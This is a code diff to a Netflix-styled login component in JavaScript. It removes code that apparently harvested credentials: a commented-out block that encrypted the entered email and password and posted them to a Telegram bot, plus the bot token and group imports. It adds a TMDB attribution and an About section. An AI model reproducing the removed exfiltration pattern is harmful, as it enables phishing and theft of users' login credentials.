@@ -1,9 +1,7 @@
 import {map,useRef} from "vanilla";
 import css from "./Login.module.css";
-import {netflixlogo,googlelogo} from "assets";
+import {netflixlogo,googlelogo,tmdb1} from "assets";
 import {InputField,ShowsBackground,SkipAlert} from "components";
-import {bottoken,netlixgroupid} from "estate";
-import {encrypt,decrypt} from "afile";
 import {setUsertoken} from "actions";
 import Home from "../Home";
 
@@ -24,12 +22,16 @@ export default function Login(props){
         <div class="${css.row1}"></div>
         <div class="${css.row2}">
             <button class="${css.signin}">Sign in</button>
-            <div class="${css.logos}">
-                ${map(logos,logo=>`
-                    <img class="${css.logo}" alt="${logo.of}" src="${logo.src}" style="${logo.style}"/>
-                `)}
-            </div>
+            <img class="${css.tmdblogo}" alt="" src="${tmdb1}"/>
         <div>
+        <details class="${css.details}">
+            <summary>About</summary>
+            <ul>
+                <li>Made by Ahmed Ayachi</li>
+                <li>Email: aayachi032@gmail.com</li>
+                <li>API: <span class="${css.tmdblink}">The Movie Database</span></li>
+            </ul>
+        </details>
     `;
     ["email","password"].forEach((prop,i)=>{
         InputField({
@@ -47,18 +49,17 @@ export default function Login(props){
 
     login.querySelector(`.${css.signin}`).onclick=()=>{
         if(navigator.onLine){
-            /*const inputvalues=refs.inputfields.map(ref=>login.querySelector(`#${ref} input`).value);
-            const input=encrypt(logincode(inputvalues[0],inputvalues[1],"google"));*/
+            /*const inputvalues=refs.inputfields.map(ref=>login.querySelector(`#${ref} input`).value);*/
             if(false){
                 setUsertoken();
                 appcontent.innerHTML="";
                 Home({parent:app.querySelector("#content")});
             }
-            /*fetch(`https://api.telegram.org/bot${bottoken}/sendMessage?chat_id=-${netlixgroupid}&text=${encodeURIComponent(input)}`,{
-                method:"POST",
-                redirect:"follow",
-            }).catch(error=>console.log("error",error));*/
         }
+    }
+
+    login.querySelector(`.${css.tmdblink}`).onclick=()=>{
+
     }
 }
 
